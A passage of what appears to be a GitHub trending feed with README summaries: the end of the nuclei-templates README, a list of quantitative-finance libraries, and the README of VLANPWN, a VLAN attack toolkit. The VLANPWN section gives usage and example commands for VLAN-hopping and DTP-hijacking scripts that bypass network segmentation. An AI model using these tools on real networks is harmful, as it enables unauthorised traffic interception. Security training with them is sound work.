&lt;td&gt;dwisiswant0&lt;/td&gt; &#xA;       &lt;td&gt;168&lt;/td&gt; &#xA;       &lt;td&gt;misconfiguration&lt;/td&gt; &#xA;       &lt;td&gt;200&lt;/td&gt; &#xA;       &lt;td&gt;unknown&lt;/td&gt; &#xA;       &lt;td&gt;6&lt;/td&gt; &#xA;       &lt;td&gt;&lt;/td&gt; &#xA;       &lt;td&gt;&lt;/td&gt; &#xA;      &lt;/tr&gt; &#xA;      &lt;tr&gt; &#xA;       &lt;td&gt;exposure&lt;/td&gt; &#xA;       &lt;td&gt;298&lt;/td&gt; &#xA;       &lt;td&gt;princechaddha&lt;/td&gt; &#xA;       &lt;td&gt;139&lt;/td&gt; &#xA;       &lt;td&gt;workflows&lt;/td&gt; &#xA;       &lt;td&gt;187&lt;/td&gt; &#xA;       &lt;td&gt;&lt;/td&gt; &#xA;       &lt;td&gt;&lt;/td&gt; &#xA;       &lt;td&gt;&lt;/td&gt; &#xA;       &lt;td&gt;&lt;/td&gt; &#xA;      &lt;/tr&gt; &#xA;      &lt;tr&gt; &#xA;       &lt;td&gt;cve2021&lt;/td&gt; &#xA;       &lt;td&gt;291&lt;/td&gt; &#xA;       &lt;td&gt;0x_akoko&lt;/td&gt; &#xA;       &lt;td&gt;139&lt;/td&gt; &#xA;       &lt;td&gt;token-spray&lt;/td&gt; &#xA;       &lt;td&gt;169&lt;/td&gt; &#xA;       &lt;td&gt;&lt;/td&gt; &#xA;       &lt;td&gt;&lt;/td&gt; &#xA;       &lt;td&gt;&lt;/td&gt; &#xA;       &lt;td&gt;&lt;/td&gt; &#xA;      &lt;/tr&gt; &#xA;      &lt;tr&gt; &#xA;       &lt;td&gt;wp-plugin&lt;/td&gt; &#xA;       &lt;td&gt;274&lt;/td&gt; &#xA;       &lt;td&gt;gy741&lt;/td&gt; &#xA;       &lt;td&gt;122&lt;/td&gt; &#xA;       &lt;td&gt;default-logins&lt;/td&gt; &#xA;       &lt;td&gt;96&lt;/td&gt; &#xA;       &lt;td&gt;&lt;/td&gt; &#xA;       &lt;td&gt;&lt;/td&gt; &#xA;       &lt;td&gt;&lt;/td&gt; &#xA;       &lt;td&gt;&lt;/td&gt; &#xA;      &lt;/tr&gt; &#xA;      &lt;tr&gt; &#xA;       &lt;td&gt;tech&lt;/td&gt; &#xA;       &lt;td&gt;274&lt;/td&gt; &#xA;       &lt;td&gt;pussycat0x&lt;/td&gt; &#xA;       &lt;td&gt;116&lt;/td&gt; &#xA;       &lt;td&gt;file&lt;/td&gt; &#xA;       &lt;td&gt;68&lt;/td&gt; &#xA;       &lt;td&gt;&lt;/td&gt; &#xA;       &lt;td&gt;&lt;/td&gt; &#xA;       &lt;td&gt;&lt;/td&gt; &#xA;       &lt;td&gt;&lt;/td&gt; &#xA;      &lt;/tr&gt; &#xA;     &lt;/tbody&gt; &#xA;    &lt;/table&gt; &lt;p&gt;&lt;strong&gt;264 directories, 3622 files&lt;/strong&gt;.&lt;/p&gt; &lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt;&#xA;&lt;/table&gt; &#xA;&lt;h2&gt;📖 Documentation&lt;/h2&gt; &#xA;&lt;p&gt;Please navigate to &lt;a href=&#34;https://nuclei.projectdiscovery.io&#34;&gt;https://nuclei.projectdiscovery.io&lt;/a&gt; for detailed documentation to &lt;strong&gt;build&lt;/strong&gt; new or your own &lt;strong&gt;custom&lt;/strong&gt; templates. We have also added a set of templates to help you understand how things work.&lt;/p&gt; &#xA;&lt;h2&gt;💪 Contributions&lt;/h2&gt; &#xA;&lt;p&gt;Nuclei-templates is powered by major contributions from the community. &lt;a href=&#34;https://github.com/projectdiscovery/nuclei-templates/issues/new?assignees=&amp;amp;labels=&amp;amp;template=submit-template.md&amp;amp;title=%5Bnuclei-template%5D+&#34;&gt;Template contributions &lt;/a&gt;, &lt;a href=&#34;https://github.com/projectdiscovery/nuclei-templates/issues/new?assignees=&amp;amp;labels=&amp;amp;template=feature_request.md&amp;amp;title=%5BFeature%5D+&#34;&gt;Feature Requests&lt;/a&gt; and &lt;a href=&#34;https://github.com/projectdiscovery/nuclei-templates/issues/new?assignees=&amp;amp;labels=&amp;amp;template=bug_report.md&amp;amp;title=%5BBug%5D+&#34;&gt;Bug Reports&lt;/a&gt; are more than welcome.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://repobeats.axiom.co/api/embed/55ee65543bb9a0f9c797626c4e66d472a517d17c.svg?sanitize=true&#34; alt=&#34;Alt&#34; title=&#34;Repobeats analytics image&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;💬 Discussion&lt;/h2&gt; &#xA;&lt;p&gt;Have questions / doubts / ideas to discuss? Feel free to open a discussion on &lt;a href=&#34;https://github.com/projectdiscovery/nuclei-templates/discussions&#34;&gt;Github discussions&lt;/a&gt; board.&lt;/p&gt; &#xA;&lt;h2&gt;👨‍💻 Community&lt;/h2&gt; &#xA;&lt;p&gt;You are welcome to join the active &lt;a href=&#34;https://discord.gg/projectdiscovery&#34;&gt;Discord Community&lt;/a&gt; to discuss directly with project maintainers and share things with others around security and automation. Additionally, you may follow us on &lt;a href=&#34;https://twitter.com/pdnuclei&#34;&gt;Twitter&lt;/a&gt; to be updated on all the things about Nuclei.&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://github.com/projectdiscovery/nuclei-templates/graphs/contributors&#34;&gt; &lt;img src=&#34;https://contrib.rocks/image?repo=projectdiscovery/nuclei-templates&amp;amp;max=300&#34;&gt; &lt;/a&gt; &lt;/p&gt; &#xA;&lt;p&gt;Thanks again for your contribution and keeping this community vibrant. &lt;span&gt;❤️&lt;/span&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>necreas1ng/VLANPWN</title>
    <updated>2022-06-02T01:32:44Z</updated>
    <id>tag:github.com,2022-06-02:/necreas1ng/VLANPWN</id>
    <link href="https://github.com/necreas1ng/VLANPWN" rel="alternate"></link>
    <summary type="html">&lt;p&gt;VLAN attacks toolkit&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;VLANPWN&lt;/h1&gt; &#xA;&lt;p&gt;VLAN attacks toolkit&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;The author has nothing to do with those who will use this tool for personal purposes to destroy other people&#39;s computer networks. The tools are presented for training purposes to help engineers improve the security of their network.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;ᛝ&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;DoubleTagging.py&lt;/strong&gt; - This tool is designed to carry out a VLAN Hopping attack. As a result of injection of a frame with two 802.1Q tags, a test ICMP request will also be sent.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;DTPHijacking.py&lt;/strong&gt; - A script for conducting a DTP Switch Spoofing/Hijacking attack. Sends a malicious DTP-Desirable frame, as a result of which the attacker&#39;s machine becomes a trunk channel. The impact of this attack is that you can bypass the segmentation of VLAN networks and see all the traffic of VLAN networks.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;python3 DoubleTagging.py --help&#xA;&#xA;.s    s.  .s        .s5SSSs.  .s    s.  .s5SSSs.  .s s.  s.  .s    s.&#xA;      SS.                 SS.       SS.       SS.    SS. SS.       SS.&#xA;sS    S%S sS        sS    S%S sSs.  S%S sS    S%S sS S%S S%S sSs.  S%S&#xA;SS    S%S SS        SS    S%S SS`S. S%S SS    S%S SS S%S S%S SS`S. S%S&#xA;SS    S%S SS        SSSs. S%S SS `S.S%S SS .sS::&#39; SS S%S S%S SS `S.S%S&#xA; SS   S%S SS        SS    S%S SS  `sS%S SS        SS S%S S%S SS  `sS%S&#xA; SS   `:; SS        SS    `:; SS    `:; SS        SS `:; `:; SS    `:;&#xA;  SS  ;,. SS    ;,. SS    ;,. SS    ;,. SS        SS ;,. ;,. SS    ;,.&#xA;   `:;;:&#39; `:;;;;;:&#39; :;    ;:&#39; :;    ;:&#39; `:        `:;;:&#39;`::&#39; :;    ;:&#39;&#xA;&#xA;VLAN Double Tagging inject tool. Jump into another VLAN!&#xA;&#xA;Author: @necreas1ng, &amp;lt;necreas1ng@protonmail.com&amp;gt;&#xA;&#xA;usage: DoubleTagging.py [-h] --interface INTERFACE --nativevlan NATIVEVLAN --targetvlan TARGETVLAN --victim VICTIM --attacker ATTACKER&#xA;&#xA;options:&#xA;  -h, --help            show this help message and exit&#xA;  --interface INTERFACE&#xA;                        Specify your network interface&#xA;  --nativevlan NATIVEVLAN&#xA;                        Specify the Native VLAN ID&#xA;  --targetvlan TARGETVLAN&#xA;                        Specity the target VLAN ID for attack&#xA;  --victim VICTIM       Specity the target IP&#xA;  --attacker ATTACKER   Specify the attacker IP&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;python3 DoubleTagging.py --interface eth0 --nativevlan 1 --targetvlan 20 --victim 10.10.20.24 --attacker 10.10.10.54&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code&gt;python3 DTPHijacking.py --help&#xA;&#xA;.s    s.  .s        .s5SSSs.  .s    s.  .s5SSSs.  .s s.  s.  .s    s.&#xA;    SS.                 SS.       SS.       SS.    SS. SS.       SS.&#xA;sS    S%S sS        sS    S%S sSs.  S%S sS    S%S sS S%S S%S sSs.  S%S&#xA;SS    S%S SS        SS    S%S SS`S. S%S SS    S%S SS S%S S%S SS`S. S%S&#xA;SS    S%S SS        SSSs. S%S SS `S.S%S SS .sS::&#39; SS S%S S%S SS `S.S%S&#xA;SS   S%S SS        SS    S%S SS  `sS%S SS        SS S%S S%S SS  `sS%S&#xA;SS   `:; SS        SS    `:; SS    `:; SS        SS `:; `:; SS    `:;&#xA;SS  ;,. SS    ;,. SS    ;,. SS    ;,. SS        SS ;,. ;,. SS    ;,.&#xA; `:;;:&#39; `:;;;;;:&#39; :;    ;:&#39; :;    ;:&#39; `:        `:;;:&#39;`::&#39; :;    ;:&#39;&#xA;&#xA;DTP Switch Hijacking tool. Become a trunk!&#xA;&#xA;Author: @necreas1ng, &amp;lt;necreas1ng@protonmail.com&amp;gt;&#xA;&#xA;usage: DTPHijacking.py [-h] --interface INTERFACE&#xA;&#xA;options:&#xA;-h, --help            show this help message and exit&#xA;--interface INTERFACE&#xA;                      Specify your network interface&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;python3 DTPHijacking.py --interface eth0&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>wilsonfreitas/awesome-quant</title>
    <updated>2022-06-02T01:32:44Z</updated>
    <id>tag:github.com,2022-06-02:/wilsonfreitas/awesome-quant</id>
    <link href="https://github.com/wilsonfreitas/awesome-quant" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A curated list of insanely awesome libraries, packages and resources for Quants (Quantitative Finance)&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;awesome-quant&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://awesome.re&#34;&gt;&lt;img src=&#34;https://awesome.re/badge.svg?sanitize=true&#34; alt=&#34;Awesome&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;A curated list of insanely awesome libraries, packages and resources for Quants (Quantitative Finance)&lt;/p&gt; &#xA;&lt;h2&gt;Languages&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wilsonfreitas/awesome-quant/master/#python&#34;&gt;Python&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wilsonfreitas/awesome-quant/master/#r&#34;&gt;R&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wilsonfreitas/awesome-quant/master/#matlab&#34;&gt;Matlab&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wilsonfreitas/awesome-quant/master/#julia&#34;&gt;Julia&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wilsonfreitas/awesome-quant/master/#java&#34;&gt;Java&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wilsonfreitas/awesome-quant/master/#javascript&#34;&gt;JavaScript&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wilsonfreitas/awesome-quant/master/#haskell&#34;&gt;Haskell&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wilsonfreitas/awesome-quant/master/#scala&#34;&gt;Scala&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wilsonfreitas/awesome-quant/master/#ruby&#34;&gt;Ruby&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wilsonfreitas/awesome-quant/master/#elixirerlang&#34;&gt;Elixir/Erlang&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wilsonfreitas/awesome-quant/master/#golang&#34;&gt;Golang&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wilsonfreitas/awesome-quant/master/#cpp&#34;&gt;CPP&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wilsonfreitas/awesome-quant/master/#csharp&#34;&gt;CSharp&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wilsonfreitas/awesome-quant/master/#rust&#34;&gt;Rust&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wilsonfreitas/awesome-quant/master/#frameworks&#34;&gt;Frameworks&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/wilsonfreitas/awesome-quant/master/#reproducing-works&#34;&gt;Reproducing Works&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Python&lt;/h2&gt; &#xA;&lt;h3&gt;Numerical Libraries &amp;amp; Data Structures&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.numpy.org&#34;&gt;numpy&lt;/a&gt; - NumPy is the fundamental package for scientific computing with Python.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.scipy.org&#34;&gt;scipy&lt;/a&gt; - SciPy (pronounced “Sigh Pie”) is a Python-based ecosystem of open-source software for mathematics, science, and engineering.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pandas.pydata.org&#34;&gt;pandas&lt;/a&gt; - pandas is an open source, BSD-licensed library providing high-performance, easy-to-use data structures and data analysis tools for the Python programming language.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/johnbywater/quantdsl&#34;&gt;quantdsl&lt;/a&gt; - Domain specific language for quantitative analytics in finance and trading.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.python.org/3/library/statistics.html&#34;&gt;statistics&lt;/a&gt; - Builtin Python library for all basic statistical calculations.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.sympy.org/&#34;&gt;sympy&lt;/a&gt; - SymPy is a Python library for symbolic mathematics.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://docs.pymc.io/&#34;&gt;pymc3&lt;/a&gt; - Probabilistic Programming in Python: Bayesian Modeling and Probabilistic Machine Learning with Theano.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Financial Instruments and Pricing&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/enthought/pyql&#34;&gt;PyQL&lt;/a&gt; - QuantLib&#39;s Python port.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/opendoor-labs/pyfin&#34;&gt;pyfin&lt;/a&gt; - Basic options pricing in Python. [ARCHIVED]&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/vollib/vollib&#34;&gt;vollib&lt;/a&gt; - vollib is a python library for calculating option prices, implied volatility and greeks.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/jsmidt/QuantPy&#34;&gt;QuantPy&lt;/a&gt; - A framework for quantitative finance In python.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/alpha-miner/Finance-Python&#34;&gt;Finance-Python&lt;/a&gt; - Python tools for Finance.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/pmorissette/ffn&#34;&gt;ffn&lt;/a&gt; - A financial function library for Python.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/GriffinAustin/pynance&#34;&gt;pynance&lt;/a&gt; - Lightweight Python library for assembling and analysing financial data.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/bpsmith/tia&#34;&gt;tia&lt;/a&gt; - Toolkit for integration and analysis.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://platform.hasura.io/hub/projects/hasura/base-python-dash&#34;&gt;hasura/base-python-dash&lt;/a&gt; - Hasura quickstart to deploy Dash framework. Written on top of Flask, Plotly.js, and React.js, Dash is ideal for building data visualization apps with highly custom user interfaces in pure Python.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://platform.hasura.io/hub/projects/hasura/base-python-bokeh&#34;&gt;hasura/base-python-bokeh&lt;/a&gt; - Hasura quickstart to visualize data with bokeh library.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ynouri/pysabr&#34;&gt;pysabr&lt;/a&gt; - SABR model Python implementation.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/domokane/FinancePy&#34;&gt;FinancePy&lt;/a&gt; - A Python Finance Library that focuses on the pricing and risk-management of Financial Derivatives, including fixed-income, equity, FX and credit derivatives.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/goldmansachs/gs-quant&#34;&gt;gs-quant&lt;/a&gt; - Python toolkit for quantitative finance&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/federicomariamassari/willowtree&#34;&gt;willowtree&lt;/a&gt; - Robust and flexible Python implementation of the willow tree lattice for derivatives pricing.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/federicomariamassari/financial-engineering&#34;&gt;financial-engineering&lt;/a&gt; - Applications of Monte Carlo methods to financial engineering projects, in Python.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dbrojas/optlib&#34;&gt;optlib&lt;/a&gt; - A library for financial options pricing written in Python.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/google/tf-quant-finance&#34;&gt;tf-quant-finance&lt;/a&gt; - High-performance TensorFlow library for quantitative finance.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/RomanMichaelPaolucci/Q-Fin&#34;&gt;Q-Fin&lt;/a&gt; - A Python library for mathematical finance.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/quantsbin/Quantsbin&#34;&gt;Quantsbin&lt;/a&gt; - Tools for pricing and plotting of vanilla option prices, greeks and various other analysis around them.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/bbcho/finoptions-dev&#34;&gt;finoptions&lt;/a&gt; - Complete python implementation of R package fOptions with partial implementation of fExoticOptions for pricing various options.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Indicators&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/femtotrader/pandas_talib&#34;&gt;pandas_talib&lt;/a&gt; - A Python Pandas implementation of technical analysis indicators.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/peerchemist/finta&#34;&gt;finta&lt;/a&gt; - Common financial technical analysis indicators implemented in Pandas.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/cirla/tulipy&#34;&gt;Tulipy&lt;/a&gt; - Financial Technical Analysis Indicator Library (Python bindings for &lt;a href=&#34;https://github.com/TulipCharts/tulipindicators&#34;&gt;tulipindicators&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Boulder-Investment-Technologies/lppls&#34;&gt;lppls&lt;/a&gt; - A Python module for fitting the &lt;a href=&#34;https://en.wikipedia.org/wiki/Didier_Sornette#The_JLS_and_LPPLS_models&#34;&gt;Log-Periodic Power Law Singularity (LPPLS)&lt;/a&gt; model.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Trading &amp;amp; Backtesting&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Blankly-Finance/Blankly&#34;&gt;Blankly&lt;/a&gt; - Fully integrated backtesting, paper trading, and live deployment.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/mrjbq7/ta-lib&#34;&gt;TA-Lib&lt;/a&gt; - Python wrapper for TA-Lib (&lt;a href=&#34;http://ta-lib.org/&#34;&gt;http://ta-lib.org/&lt;/a&gt;).&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/quantopian/zipline&#34;&gt;zipline&lt;/a&gt; - Pythonic algorithmic trading library.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/QuantSoftware/QuantSoftwareToolkit&#34;&gt;QuantSoftware Toolkit&lt;/a&gt; - Python-based open source software framework designed to support portfolio construction and management.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/jeffrey-liang/quantitative&#34;&gt;quantitative&lt;/a&gt; - Quantitative finance, and backtesting library.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/llazzaro/analyzer&#34;&gt;analyzer&lt;/a&gt; - Python framework for real-time financial and backtesting trading strategies.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/pmorissette/bt&#34;&gt;bt&lt;/a&gt; - Flexible Backtesting for Python.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/backtrader/backtrader&#34;&gt;backtrader&lt;/a&gt; - Python Backtesting library for trading strategies.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/thalesians/pythalesians&#34;&gt;pythalesians&lt;/a&gt; - Python library to backtest trading strategies, plot charts, seamlessly download market data, analyse market patterns etc.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ematvey/pybacktest&#34;&gt;pybacktest&lt;/a&gt; - Vectorized backtesting framework in Python / pandas, designed to make your backtesting easier.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/gbeced/pyalgotrade&#34;&gt;pyalgotrade&lt;/a&gt; - Python Algorithmic Trading Library.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pypi.org/project/tradingWithPython/&#34;&gt;tradingWithPython&lt;/a&gt; - A collection of functions and classes for Quantitative trading.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/twopirllc/pandas-ta&#34;&gt;Pandas TA&lt;/a&gt; - Pandas TA is an easy to use Python 3 Pandas Extension with 115+ Indicators. Easily build Custom Strategies.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/bukosabino/ta&#34;&gt;ta&lt;/a&gt; - Technical Analysis Library using Pandas (Python)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/joequant/algobroker&#34;&gt;algobroker&lt;/a&gt; - This is an execution engine for algo trading.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pypi.org/project/pysentosa/&#34;&gt;pysentosa&lt;/a&gt; - Python API for sentosa trading system.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/cuemacro/finmarketpy&#34;&gt;finmarketpy&lt;/a&gt; - Python library for backtesting trading strategies and analyzing financial markets.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/metaperl/binary-martingale&#34;&gt;binary-martingale&lt;/a&gt; - Computer program to automatically trade binary options martingale style.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/foolcage/fooltrader&#34;&gt;fooltrader&lt;/a&gt; - the project using big-data technology to provide an uniform way to analyze the whole market.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/zvtvz/zvt&#34;&gt;zvt&lt;/a&gt; - the project using sql,pandas to provide an uniform and extendable way to record data,computing factors,select securites, backtesting,realtime trading and it could show all of them in clearly charts in realtime.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/alpacahq/pylivetrader&#34;&gt;pylivetrader&lt;/a&gt; - zipline-compatible live trading library.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/alpacahq/pipeline-live&#34;&gt;pipeline-live&lt;/a&gt; - zipline&#39;s pipeline capability with IEX for live trading.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/quantrocket-llc/zipline-extensions&#34;&gt;zipline-extensions&lt;/a&gt; - Zipline extensions and adapters for QuantRocket.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/quantrocket-llc/moonshot&#34;&gt;moonshot&lt;/a&gt; - Vectorized backtester and trading engine for QuantRocket based on Pandas.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/robertmartin8/PyPortfolioOpt&#34;&gt;PyPortfolioOpt&lt;/a&gt; - Financial portfolio optimisation in python, including classical efficient frontier and advanced methods.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/tradytics/eiten&#34;&gt;Eiten&lt;/a&gt; - Eiten is an open source toolkit by Tradytics that implements various statistical and algorithmic investing strategies such as Eigen Portfolios, Minimum Variance Portfolios, Maximum Sharpe Ratio Portfolios, and Genetic Algorithms based Portfolios.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dppalomar/riskparity.py&#34;&gt;riskparity.py&lt;/a&gt; - fast and scalable design of risk parity portfolios with TensorFlow 2.0&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/hudson-and-thames/mlfinlab&#34;&gt;mlfinlab&lt;/a&gt; - Implementations regarding &#34;Advances in Financial Machine Learning&#34; by Marcos Lopez de Prado. (Feature Engineering, Financial Data Structures, Meta-Labeling)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/abbass2/pyqstrat&#34;&gt;pyqstrat&lt;/a&gt; - A fast, extensible, transparent python library for backtesting quantitative strategies.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/edouardpoitras/NowTrade&#34;&gt;NowTrade&lt;/a&gt; - Python library for backtesting technical/mechanical strategies in the stock and currency markets.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/fja05680/pinkfish&#34;&gt;pinkfish&lt;/a&gt; - A backtester and spreadsheet library for security analysis.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/timkpaine/aat&#34;&gt;aat&lt;/a&gt; - Async Algorithmic Trading Engine&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://kernc.github.io/backtesting.py/&#34;&gt;Backtesting.py&lt;/a&gt; - Backtest trading strategies in Python&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/enigmampc/catalyst&#34;&gt;catalyst&lt;/a&gt; - An Algorithmic Trading Library for Crypto-Assets in Python&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ranaroussi/quantstats&#34;&gt;quantstats&lt;/a&gt; - Portfolio analytics for quants, written in Python&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ranaroussi/qtpylib&#34;&gt;qtpylib&lt;/a&gt; - QTPyLib, Pythonic Algorithmic Trading &lt;a href=&#34;http://qtpylib.io&#34;&gt;http://qtpylib.io&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/constverum/Quantdom&#34;&gt;Quantdom&lt;/a&gt; - Python-based framework for backtesting trading strategies &amp;amp; analyzing financial markets [GUI &lt;img alt=&#34;neckbeard&#34; src=&#34;https://github.githubassets.com/images/icons/emoji/neckbeard.png?v8&#34;&gt;)]&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/freqtrade/freqtrade&#34;&gt;freqtrade&lt;/a&gt; - Free, open source crypto trading bot&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/chrisconlan/algorithmic-trading-with-python&#34;&gt;algorithmic-trading-with-python&lt;/a&gt; - Free &lt;code&gt;pandas&lt;/code&gt; and 